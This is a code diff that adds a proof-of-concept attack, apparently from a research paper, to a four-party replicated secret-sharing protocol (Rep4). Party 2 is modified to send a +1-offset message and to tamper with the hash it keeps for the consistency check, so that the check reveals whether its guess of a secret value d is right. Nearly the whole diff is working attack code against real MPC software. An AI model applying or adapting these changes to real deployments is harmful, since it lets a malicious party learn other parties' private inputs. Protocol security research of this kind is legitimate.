@@ -10,7 +10,9 @@
 
 template<class T>
 Rep4<T>::Rep4(Player& P) :
-        my_num(P.my_num()), P(P)
+        // F4attack-changes: Initialize helper variables for internal bookkeeping
+        F4attack_mult_counter(0), my_num(P.my_num()), P(P)
+        // end of F4attack-changes
 {
     assert(P.num_players() == 4);
 
@@ -30,7 +32,9 @@ Rep4<T>::Rep4(Player& P) :
 
 template<class T>
 Rep4<T>::Rep4(Player& P, prngs_type& prngs) :
-        my_num(P.my_num()), P(P)
+        // F4attack-changes: Initialize helper variables for internal bookkeeping
+        F4attack_mult_counter(0), my_num(P.my_num()), P(P)
+        // end of F4attack-changes
 {
     for (int i = 0; i < 3; i++)
         rep_prngs[i].SetSeed(prngs[i]);
@@ -137,6 +141,16 @@ void Rep4<T>::prepare_joint_input(int sender, int backup, int receiver,
     if (sender == P.my_num())
     {
         assert(inputs.size() == bit_lengths.size());
+        // F4attack-changes: P2 (P3 in the paper) adds an offset of +1 to its message
+        //      that it sends to P1 (P2 in the paper) for the first multiplication.
+        //      We add the offset to inputs[0]. This is the message for the first
+        //      multiplication in the current round to be sent from P2 to P1.
+        if (P.my_num() == 2 && sender == 2 && receiver == 1 && F4attack_mult_counter == 0)
+        {
+            inputs[0] += 1;
+            std::cout << "Cheating by adding offset +1 to outgoing message!" << std::endl;
+        }
+        // end of F4attack-changes
         switch (P.get_offset(backup))
         {
         case 2:
@@ -150,6 +164,12 @@ void Rep4<T>::prepare_joint_input(int sender, int backup, int receiver,
         default:
             throw not_implemented();
         }
+        // F4attack-changes: Restore prior state of inputs[0] after sending incorrect message
+        if (P.my_num() == 2 && sender == 2 && receiver == 1 && F4attack_mult_counter == 0)
+        {
+            inputs[0] -= 1;
+        }
+        // end of F4attack-changes
     }
 
     for (auto& x : send_os)
@@ -195,7 +215,37 @@ void Rep4<T>::finalize_joint_input(int sender, int backup, int receiver,
         }
 
         os->consume(0);
+        // F4attack-changes: For the second multiplication:
+        //      Let P2 (P3 in the paper), instead of appending the received message from P1 (P2 in the paper)
+        //      to the hash to later compare to the hash provided by backup P3 (P2 in the paper), guess the value of d
+        //      and manipulate what is appended to the hash such that it will match the hash provided by P3 in the
+        //      consistency check iff the guess was correct.
+        if (P.my_num() == 2 && sender == 1 && backup == 3 && receiver == 2 && F4attack_mult_counter == 1 && malicious)
+        {
+            typedef typename T::open_type open_type;
+            // Test for the following value for d:
+            open_type d_test = 42; // This could be changed to any value inside the computation domain
+            std::cout << "Guessing that d=" << d_test << "..." << std::endl; 
+            open_type sum_of_own_d_shares = F4attack_val_d[0] + F4attack_val_d[1] + F4attack_val_d[2];
+            // What the share not held by P2 should be if d == d_test:
+            open_type d_missing_share_test = d_test - sum_of_own_d_shares;
 
+            // We receive from P1 (P2 in the paper) a message offset by +(the share of d that we do not have).
+            // Furthermore, we will later receive from backup P3 (P4 in the paper) a hash containing this message,
+            // but without the offset. Here, we subtract our guess for the unknown share of d (d_missing_share_test)
+            // from the received message before appending it to the hash. The result, hence, exactly matches what
+            // we will later receive from P3 if the unknown share offset is canceled out by d_missing_share_test,
+            // implying that they are equal ==> d == d_test.
+            // This exactly matches the hash comparison described in §4 of our paper (directly before §4.1).
+            open_type received = res[1]; // this is the received payload
+            open_type rec_minus_offset = received - d_missing_share_test;
+            receive_hashes[sender][backup].update(&rec_minus_offset, sizeof(open_type));
+
+            // Skip standard hash append below:
+            return;
+            // Otherwise, do the standard hash append normally, see below:
+        }
+        // end of F4attack-changes
         if (malicious)
             receive_hashes[sender][backup].update(start,
                     os->get_data_ptr() - start);
@@ -215,6 +265,13 @@ void Rep4<T>::prepare_mul(const T& x, const T& y, int n_bits)
     for (int i = 0; i < 5; i++)
         add_shares[i].push_back(a[i]);
     bit_lengths.push_back(n_bits);
+    // F4attack-changes: Second input to second multiplication is d; let P2 (P3 in the paper)
+    //      save its own shares to F4attack_val_d for easier access in our attack.
+    if (P.my_num() == 2 && F4attack_mult_counter == 1)
+    {
+        F4attack_val_d = y;
+    }
+    // end of F4attack-changes
 }
 
 template<class T>
@@ -278,6 +335,13 @@ template<class T>
 T Rep4<T>::finalize_mul(int n_bits)
 {
     this->add_mul(n_bits);
+    // F4attack-changes: Keep track of number of executed multiplications to identify which
+    //      multiplication to attack.
+    if (P.my_num() == 2)
+    {
+        F4attack_mult_counter++;
+    }
+    // end of F4attack-changes
     if (n_bits == -1)
         return results.next().res;
     else
@@ -308,6 +372,9 @@ template<class T>
 void Rep4<T>::must_check()
 {
     CODE_LOCATION
+    // F4attack-changes: Additional logging of each time that the consistency check runs
+    std::cout << "Running consistency check..." << std::endl;
+    // end of F4attack-changes
     octetStreams to_send(P);
     for (int i = 1; i < 4; i++)
         for (int j = 0; j < 4; j++)
@@ -321,6 +388,19 @@ void Rep4<T>::must_check()
         for (int j = 0; j < 4; j++)
         {
             to_receive[P.get_player(-i)].consume(tmp, Hash::hash_length);
+            // F4attack-changes: Hash that P2 (P3 in the paper receives from P3 (P4 in the paper)
+            //      is consistent ==> prior guess about d was correct.
+            if (P.my_num() == 2 && j == 1 && i == 3) // i/j see below
+            {
+                // Semantic is receive_hashes[sender][backup] where sender provides message and
+                // backup provides hash. We care about the case where sender=P1 provides the message
+                // and backup=P3 provides the hash.
+                if (receive_hashes[1][3].final() == tmp)
+                    std::cout << "Prior guess for d was correct!" << std::endl;
+                else
+                    std::cout << "Prior guess for d was not correct." << std::endl;
+            }
+            // end of F4attack-changes
             if (receive_hashes[j][P.get_player(-i)].final() != tmp)
                 throw runtime_error(
                         "hash mismatch for sender " + to_string(j)
